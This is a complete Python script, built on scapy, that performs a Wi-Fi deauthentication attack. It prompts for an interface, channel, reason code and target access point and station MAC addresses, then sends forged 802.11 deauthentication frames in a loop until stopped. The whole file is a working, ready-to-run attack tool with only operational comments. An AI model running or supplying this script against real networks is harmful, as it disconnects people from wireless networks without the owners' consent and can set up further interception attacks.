from scapy.all import *
import time
import threading
import os

# Let user select network interface to perform attack
while(True): # Emulating do while in python
	ifaces = get_if_list() # Get interfaces in loop in case a new one appears
	iface=input(f"Name of desired interface to perform deauthentication attack {ifaces} : ")

	if(iface in ifaces):
		break

# Let user select the network current channel
while(True): # Emulating do while in python
	ch=int(input("Select channel of the network to attack [0 - 14] : "))

	if(ch < 15 and ch > 0):
		os.system(f"iwconfig {iface} channel {ch}")
		break

# Deauth reason code choices
while(True): # Emulating do while in python
	print ("Select deauthentication reason code [1, 4, 5, 8] :")
	print ("1 - Unspecified") # We don’t know what’s wrong
	print ("4 - Disassociated due to inactivity") # Client session timeout exceeded
	print ("5 - Disassociated because AP is unable to handle all currently associated stations") # The access point is busy
	print ("8 - Deauthenticated because sending STA is leaving BSS") # Operating System moved the client to another access point using non-aggressive load balancing

	reason = int(input())

	# Till user find the way
	if(reason in [1 ,4 ,5 , 8]):
		break

# Mac addresses user input
ap = input("Enter AP mac address : ")
sta = input("Enter station mac address to deauthenticate : ")

# Choosing wheter packet must be send to/from sta/ap
if(reason == 8):
	sta, ap = ap, sta

# Build packet with scapy
p = RadioTap() / Dot11(addr1=sta, addr2=ap) / Dot11Deauth(reason=reason)
print("\nPacket :")
p.show()

# Send deauth packet over selected user interface until user stops the script

def attack(i, stop):
	while True:
		sendp(p, iface=i, verbose=False)
		print('.', end=' ', flush=True)
		time.sleep(0.5)

		if stop():
			break

stop_threads = False
a = threading.Thread(target=attack, args=(iface, lambda: stop_threads))

a.start()
input("Press <enter> to stop attack\n")
stop_threads = True
a.join()

print("Successfully terminated attack")

